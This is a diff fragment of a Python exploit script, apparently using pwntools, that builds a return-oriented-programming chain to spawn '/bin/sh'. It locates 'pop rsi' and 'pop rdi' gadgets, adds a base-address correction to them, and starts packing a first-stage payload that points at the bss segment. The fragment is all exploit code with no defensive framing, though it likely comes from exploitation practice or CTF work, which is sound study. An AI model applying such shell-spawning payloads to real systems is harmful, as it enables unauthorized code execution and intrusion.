@@ -59,8 +59,8 @@ if __name__ == '__main__':
 
     # Store "/bin/sh" here so we can have a pointer ot it
     second_stage += b"/bin/sh\x00"
-    pop_rsi = t.rop.find_gadget(['pop rsi', 'pop r15',  'ret']).address
-    pop_rdi = t.rop.find_gadget(['pop rdi', 'ret']).address
+    pop_rsi = t.rop.find_gadget(['pop rsi', 'pop r15',  'ret']).address + t.base_address_fix
+    pop_rdi = t.rop.find_gadget(['pop rdi', 'ret']).address + t.base_address_fix
     first_stage = t.create_payload(
         p64(pop_rsi) +
         p64(bss) +
